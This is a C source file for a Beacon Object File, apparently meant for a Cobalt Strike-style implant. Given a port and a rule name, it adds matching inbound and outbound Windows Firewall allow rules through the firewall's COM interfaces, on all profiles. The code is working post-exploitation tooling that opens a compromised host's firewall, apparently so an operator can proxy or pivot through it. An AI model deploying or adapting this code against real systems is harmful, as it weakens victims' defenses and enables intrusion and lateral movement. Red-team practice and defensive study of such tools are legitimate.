/*
 * addfwproxyrule.c — BOF to add paired inbound+outbound firewall rules via COM
 *
 * Usage: addfwproxyrule <port> <rulename> [apppath]
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -o addfwproxyrule.o -c addfwproxyrule.c -masm=intel
 */

#include <windows.h>
#include "beacon.h"

// ─── COM IMPORTS ──────────────────────────────────────────────────────────────

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);

DECLSPEC_IMPORT BSTR    WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(BSTR);

DECLSPEC_IMPORT int     __cdecl MSVCRT$swprintf(wchar_t*, const wchar_t*, ...);
DECLSPEC_IMPORT size_t  __cdecl MSVCRT$wcslen(const wchar_t*);
DECLSPEC_IMPORT int     __cdecl MSVCRT$_wcsicmp(const wchar_t*, const wchar_t*);
DECLSPEC_IMPORT void*   __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT int     __cdecl MSVCRT$sprintf(char*, const char*, ...);

// ─── INetFwRule / INetFwRules / INetFwPolicy2 vtable structs ─────────────────

// NET_FW_ACTION
#define BOF_NET_FW_ACTION_ALLOW   1

// NET_FW_RULE_DIRECTION
#define BOF_NET_FW_RULE_DIR_IN    1
#define BOF_NET_FW_RULE_DIR_OUT   2

// NET_FW_IP_PROTOCOL
#define BOF_NET_FW_IP_PROTOCOL_TCP 6

// GUIDs — inline to avoid linking netfw.h
static const GUID CLSID_NetFwPolicy2_BOF =
    {0xe2b3c97f,0x6ae1,0x41ac,{0x81,0x7a,0xf6,0xf9,0x21,0x66,0xd7,0xdd}};
static const GUID IID_INetFwPolicy2_BOF =
    {0x98325047,0xc671,0x4174,{0x8d,0x81,0xde,0xfc,0xd3,0xf0,0x31,0x86}};
static const GUID CLSID_NetFwRule_BOF =
    {0x2c5bc43e,0x3369,0x4c33,{0xab,0x0c,0xbe,0x94,0x69,0x67,0x7a,0xf4}};
static const GUID IID_INetFwRule_BOF =
    {0xaf230d27,0xbaba,0x4e42,{0xac,0xed,0xf5,0x24,0xf2,0x2c,0xfc,0xe2}};

// Minimal vtable definitions — only methods we call

typedef struct INetFwRuleVtbl {
    // IUnknown
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(void*);
    ULONG   (STDMETHODCALLTYPE *Release)(void*);
    // IDispatch (4 methods, skip)
    void *GetTypeInfoCount, *GetTypeInfo, *GetIDsOfNames, *Invoke;
    // INetFwRule properties
    HRESULT (STDMETHODCALLTYPE *get_Name)(void*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *put_Name)(void*, BSTR);
    HRESULT (STDMETHODCALLTYPE *get_Description)(void*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *put_Description)(void*, BSTR);
    HRESULT (STDMETHODCALLTYPE *get_ApplicationName)(void*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *put_ApplicationName)(void*, BSTR);
    HRESULT (STDMETHODCALLTYPE *get_ServiceName)(void*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *put_ServiceName)(void*, BSTR);
    HRESULT (STDMETHODCALLTYPE *get_Protocol)(void*, LONG*);
    HRESULT (STDMETHODCALLTYPE *put_Protocol)(void*, LONG);
    HRESULT (STDMETHODCALLTYPE *get_LocalPorts)(void*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *put_LocalPorts)(void*, BSTR);
    HRESULT (STDMETHODCALLTYPE *get_RemotePorts)(void*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *put_RemotePorts)(void*, BSTR);
    HRESULT (STDMETHODCALLTYPE *get_LocalAddresses)(void*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *put_LocalAddresses)(void*, BSTR);
    HRESULT (STDMETHODCALLTYPE *get_RemoteAddresses)(void*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *put_RemoteAddresses)(void*, BSTR);
    HRESULT (STDMETHODCALLTYPE *get_IcmpTypesAndCodes)(void*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *put_IcmpTypesAndCodes)(void*, BSTR);
    HRESULT (STDMETHODCALLTYPE *get_Direction)(void*, LONG*);
    HRESULT (STDMETHODCALLTYPE *put_Direction)(void*, LONG);
    HRESULT (STDMETHODCALLTYPE *get_Interfaces)(void*, VARIANT*);
    HRESULT (STDMETHODCALLTYPE *put_Interfaces)(void*, VARIANT);
    HRESULT (STDMETHODCALLTYPE *get_InterfaceTypes)(void*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *put_InterfaceTypes)(void*, BSTR);
    HRESULT (STDMETHODCALLTYPE *get_Enabled)(void*, VARIANT_BOOL*);
    HRESULT (STDMETHODCALLTYPE *put_Enabled)(void*, VARIANT_BOOL);
    HRESULT (STDMETHODCALLTYPE *get_Grouping)(void*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *put_Grouping)(void*, BSTR);
    HRESULT (STDMETHODCALLTYPE *get_Profiles)(void*, LONG*);
    HRESULT (STDMETHODCALLTYPE *put_Profiles)(void*, LONG);
    HRESULT (STDMETHODCALLTYPE *get_EdgeTraversal)(void*, VARIANT_BOOL*);
    HRESULT (STDMETHODCALLTYPE *put_EdgeTraversal)(void*, VARIANT_BOOL);
    HRESULT (STDMETHODCALLTYPE *get_Action)(void*, LONG*);
    HRESULT (STDMETHODCALLTYPE *put_Action)(void*, LONG);
} INetFwRuleVtbl;

typedef struct { INetFwRuleVtbl* lpVtbl; } INetFwRule_BOF;

typedef struct INetFwRulesVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(void*);
    ULONG   (STDMETHODCALLTYPE *Release)(void*);
    void *GetTypeInfoCount, *GetTypeInfo, *GetIDsOfNames, *Invoke;
    HRESULT (STDMETHODCALLTYPE *get_Count)(void*, LONG*);
    HRESULT (STDMETHODCALLTYPE *Add)(void*, INetFwRule_BOF*);
    HRESULT (STDMETHODCALLTYPE *Remove)(void*, BSTR);
    HRESULT (STDMETHODCALLTYPE *Item)(void*, BSTR, INetFwRule_BOF**);
    HRESULT (STDMETHODCALLTYPE *get__NewEnum)(void*, IUnknown**);
} INetFwRulesVtbl;

typedef struct { INetFwRulesVtbl* lpVtbl; } INetFwRules_BOF;

typedef struct INetFwPolicy2Vtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(void*);
    ULONG   (STDMETHODCALLTYPE *Release)(void*);
    void *GetTypeInfoCount, *GetTypeInfo, *GetIDsOfNames, *Invoke;
    HRESULT (STDMETHODCALLTYPE *get_CurrentProfileTypes)(void*, LONG*);
    HRESULT (STDMETHODCALLTYPE *get_FirewallEnabled)(void*, LONG, VARIANT_BOOL*);
    HRESULT (STDMETHODCALLTYPE *put_FirewallEnabled)(void*, LONG, VARIANT_BOOL);
    HRESULT (STDMETHODCALLTYPE *get_ExcludedInterfaces)(void*, LONG, VARIANT*);
    HRESULT (STDMETHODCALLTYPE *put_ExcludedInterfaces)(void*, LONG, VARIANT);
    HRESULT (STDMETHODCALLTYPE *get_BlockAllInboundTraffic)(void*, LONG, VARIANT_BOOL*);
    HRESULT (STDMETHODCALLTYPE *put_BlockAllInboundTraffic)(void*, LONG, VARIANT_BOOL);
    HRESULT (STDMETHODCALLTYPE *get_NotificationsDisabled)(void*, LONG, VARIANT_BOOL*);
    HRESULT (STDMETHODCALLTYPE *put_NotificationsDisabled)(void*, LONG, VARIANT_BOOL);
    HRESULT (STDMETHODCALLTYPE *get_UnicastResponsesToMulticastBroadcastDisabled)(void*, LONG, VARIANT_BOOL*);
    HRESULT (STDMETHODCALLTYPE *put_UnicastResponsesToMulticastBroadcastDisabled)(void*, LONG, VARIANT_BOOL);
    HRESULT (STDMETHODCALLTYPE *get_DefaultInboundAction)(void*, LONG, LONG*);
    HRESULT (STDMETHODCALLTYPE *put_DefaultInboundAction)(void*, LONG, LONG);
    HRESULT (STDMETHODCALLTYPE *get_DefaultOutboundAction)(void*, LONG, LONG*);
    HRESULT (STDMETHODCALLTYPE *put_DefaultOutboundAction)(void*, LONG, LONG);
    HRESULT (STDMETHODCALLTYPE *get_Rules)(void*, INetFwRules_BOF**);
} INetFwPolicy2Vtbl;

typedef struct { INetFwPolicy2Vtbl* lpVtbl; } INetFwPolicy2_BOF;

// ─── CORE: add one rule ───────────────────────────────────────────────────────

static HRESULT addRule(INetFwRules_BOF* pRules, BSTR name, BSTR port,
                       BSTR appPath, LONG direction) {
    INetFwRule_BOF* pRule = NULL;
    HRESULT hr = OLE32$CoCreateInstance(
        &CLSID_NetFwRule_BOF, NULL, CLSCTX_INPROC_SERVER,
        &IID_INetFwRule_BOF, (void**)&pRule);
    if (FAILED(hr)) return hr;

    pRule->lpVtbl->put_Name(pRule, name);
    pRule->lpVtbl->put_Protocol(pRule, BOF_NET_FW_IP_PROTOCOL_TCP);
    pRule->lpVtbl->put_LocalPorts(pRule, port);
    pRule->lpVtbl->put_Direction(pRule, direction);
    pRule->lpVtbl->put_Action(pRule, BOF_NET_FW_ACTION_ALLOW);
    pRule->lpVtbl->put_Enabled(pRule, VARIANT_TRUE);
    pRule->lpVtbl->put_Profiles(pRule, 0x7); // All profiles

    // Optional application binding
    if (appPath && appPath[0] != L'\0')
        pRule->lpVtbl->put_ApplicationName(pRule, appPath);

    hr = pRules->lpVtbl->Add(pRules, pRule);
    pRule->lpVtbl->Release(pRule);
    return hr;
}

// ─── ENTRY POINT ─────────────────────────────────────────────────────────────

void go(char* args, int len) {
    datap parser;
    BeaconDataInit(&parser, args, len);

    wchar_t* wPort    = (wchar_t*)BeaconDataExtract(&parser, NULL);
    wchar_t* wName    = (wchar_t*)BeaconDataExtract(&parser, NULL);
    wchar_t* wAppPath = (wchar_t*)BeaconDataExtract(&parser, NULL); // optional

    if (!wPort || !wName) {
        BeaconPrintf(CALLBACK_ERROR,
            "Usage: addfwproxyrule <port> <rulename> [apppath]\n");
        return;
    }

    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CoInitializeEx failed: 0x%08lx\n", hr);
        return;
    }

    INetFwPolicy2_BOF* pPolicy = NULL;
    INetFwRules_BOF*   pRules  = NULL;

    hr = OLE32$CoCreateInstance(
        &CLSID_NetFwPolicy2_BOF, NULL, CLSCTX_INPROC_SERVER,
        &IID_INetFwPolicy2_BOF, (void**)&pPolicy);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CoCreateInstance Policy2 failed: 0x%08lx\n", hr);
        goto Cleanup;
    }

    hr = pPolicy->lpVtbl->get_Rules(pPolicy, &pRules);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] get_Rules failed: 0x%08lx\n", hr);
        goto Cleanup;
    }

    // Build rule names for inbound and outbound
    wchar_t nameIn[256], nameOut[256];
    MSVCRT$swprintf(nameIn,  L"%s (In)",  wName);
    MSVCRT$swprintf(nameOut, L"%s (Out)", wName);

    BSTR bPort    = OLEAUT32$SysAllocString(wPort);
    BSTR bNameIn  = OLEAUT32$SysAllocString(nameIn);
    BSTR bNameOut = OLEAUT32$SysAllocString(nameOut);
    BSTR bApp     = OLEAUT32$SysAllocString(wAppPath ? wAppPath : L"");

    hr = addRule(pRules, bNameIn,  bPort, bApp, BOF_NET_FW_RULE_DIR_IN);
    if (SUCCEEDED(hr))
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Inbound rule added: %S on port %S\n", nameIn, wPort);
    else
        BeaconPrintf(CALLBACK_ERROR,  "[!] Inbound rule failed: 0x%08lx\n", hr);

    hr = addRule(pRules, bNameOut, bPort, bApp, BOF_NET_FW_RULE_DIR_OUT);
    if (SUCCEEDED(hr))
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Outbound rule added: %S on port %S\n", nameOut, wPort);
    else
        BeaconPrintf(CALLBACK_ERROR,  "[!] Outbound rule failed: 0x%08lx\n", hr);

    OLEAUT32$SysFreeString(bPort);
    OLEAUT32$SysFreeString(bNameIn);
    OLEAUT32$SysFreeString(bNameOut);
    OLEAUT32$SysFreeString(bApp);

Cleanup:
    if (pRules)  pRules->lpVtbl->Release(pRules);
    if (pPolicy) pPolicy->lpVtbl->Release(pPolicy);
    OLE32$CoUninitialize();
}
